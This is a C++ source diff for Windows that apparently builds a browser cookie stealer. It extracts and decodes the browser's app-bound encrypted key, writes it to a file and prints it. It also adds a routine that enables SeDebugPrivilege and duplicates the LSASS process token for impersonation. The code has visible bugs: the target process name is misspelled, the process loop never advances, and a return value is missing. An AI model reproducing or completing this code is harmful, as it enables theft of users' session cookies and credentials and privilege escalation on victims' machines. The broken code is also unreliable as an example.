@@ -7,6 +7,8 @@
 #include <wincrypt.h>
 #include <vector>
 #include <fstream>
+#include <stdio.h>
+#include <tlhelp32.h>
 
 #define PREFIX_SIZE 4
 using json = nlohmann::json;
@@ -21,7 +23,90 @@ MSVC MSVC MSVC MSVC MSVC MSVC MSVC
 
 MSVC MSVC MSVC MSVC MSVC MSVC MSVC
 */
+class ImpersonateLSSAS {
+    public:
+    ImpersonateLSSAS() {
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &token)) throw std::runtime_error("1");
+    }
+    DWORD GetLssasPid() {
+        PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        
+        if (hSnapshot == INVALID_HANDLE_VALUE) {
+            printf("hSnapshot (GetLssasPID) has INVALID_HANDLE_VALUE\n");
+            return 0; 
+        }
 
+        if (Process32First(hSnapshot, &pe32)) {
+            do {
+                if (_wcsicmp(pe32.szExeFile, L"lssas.exe") == 0) {
+                    printf("lssas.exe pid was found, returning it %lu...\n", pe32.th32ProcessID);
+                    return pe32.th32ProcessID;
+                }
+            } while(Process32First(hSnapshot, &pe32));
+        }
+        CloseHandle(hSnapshot);
+    }
+    HANDLE getHandle() const {return token;}
+    BOOL setPrivilige(HANDLE hToken) {
+    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
+        TOKEN_PRIVILEGES tp;
+        LUID luid;
+
+        if (!LookupPrivilegeValueA( 
+            NULL,
+            "SeDebugPrivilege",
+            &luid
+        )) {
+            printf("LookupPrivilegeValueA() failed, IMPERSONATELSSAS failed\n");
+            return FALSE;
+        }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
+
+    DWORD pid = GetLssasPid();
+    HANDLE lsassProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+
+
+    HANDLE lsassAcessToken = NULL;
+    if (!OpenProcessToken(lsassProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &lsassAcessToken)) {
+        printf("lsass access token quering failed error: %u", GetLastError());
+        return FALSE;
+    }
+
+    HANDLE duplicatedToken = NULL;
+    DuplicateTokenEx(lsassAcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken);
+
+    //PROCESS CREATION HERE
+
+    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
+    if (!AdjustTokenPrivileges(
+        hToken,
+        FALSE,
+        &tp,
+        0,
+        (PTOKEN_PRIVILEGES)NULL,
+        (PDWORD)NULL
+    )) {
+        printf("AdjustTokenPrivileges() failed, IMPERSONATELSSAS failed error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        printf("GetLastError() NOT_ALL_ASSIGNED");
+        return FALSE;
+    }
+
+        printf("Privileges set successfully!\n");
+        return TRUE;
+        //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
+    }
+    private:
+    HANDLE token;
+};
 
 class CookieDecryptor {
     public:
@@ -31,16 +116,10 @@ class CookieDecryptor {
             std::vector<BYTE> decodedEncryptedKey;
             BOOL removePrefix() {
                 if (!decodedEncryptedKey.empty()) {
-                    LPVOID temp;
-                    memcpy(temp, decodedEncryptedKey.data(), PREFIX_SIZE);
-                    printf("TEMP: %s\n", reinterpret_cast<const char*>(temp));
-                    BYTE* bytesItHas = reinterpret_cast<BYTE*>(temp);
 
-                    for (size_t i = 0; i < PREFIX_SIZE; ++i) {
-                        printf("BYTE: %02X\n", bytesItHas[i]);
-                    }
-
-                    if (reinterpret_cast<const char*>(temp) == "APPB") {
+                    printf("\n\n\nDECODED BASE64 APPBOUNDKEY: %s\n", reinterpret_cast<const char*>(decodedEncryptedKey.data()));
+                    
+                    if (std::memcmp(decodedEncryptedKey.data(), "APPB", PREFIX_SIZE) == 0) {
                         std::vector<BYTE> withoutPrefix = std::vector<BYTE>(decodedEncryptedKey.begin() + PREFIX_SIZE, decodedEncryptedKey.end());
                         this->decodedEncryptedKey = withoutPrefix;                        
                         printf("Prefix has been removed successfully!\n");
@@ -57,6 +136,7 @@ class CookieDecryptor {
                 return FALSE;
             }
             std::vector<BYTE> decodeBase64(const std::string& input) {
+
                 DWORD size = 0;
                 std::vector<BYTE> output;
                 if (CryptStringToBinaryA(
@@ -86,6 +166,7 @@ class CookieDecryptor {
 
                 return output;
             }    
+            
         };
         struct KeyExtractor {
             //LETS DO SOME HARDCODE
@@ -125,7 +206,7 @@ class CookieDecryptor {
 
             void printKeys() const {
                 if (this->app_bound_encrypted_key != "" && this->encrypted_key != "") {
-                printf("Here is your keys:\n\n\nAPP_BOUND_ENCRYPTED_KEY: %s\n\n\nENCRYPTED_KEY: %s", this->app_bound_encrypted_key.c_str(), this->encrypted_key.c_str());
+                printf("Here is your keys:\n\n\nAPP_BOUND_ENCRYPTED_KEY: %s\n\n\nENCRYPTED_KEY: %s\n", this->app_bound_encrypted_key.c_str(), this->encrypted_key.c_str());
                 } else {
                 printf("There aren't any keys to print out!\n");
                 }
@@ -145,6 +226,8 @@ int main() {
     d.decodeBase64(z.app_bound_encrypted_key);
     BOOL returnvalue = d.removePrefix();
 
+    ImpersonateLSSAS ls;
+    ls.setPrivilige(ls.getHandle());
     std::ofstream writer("some.bin");
     writer.write(reinterpret_cast<const char*>(d.decodedEncryptedKey.data()), d.decodedEncryptedKey.size());
     return 0;
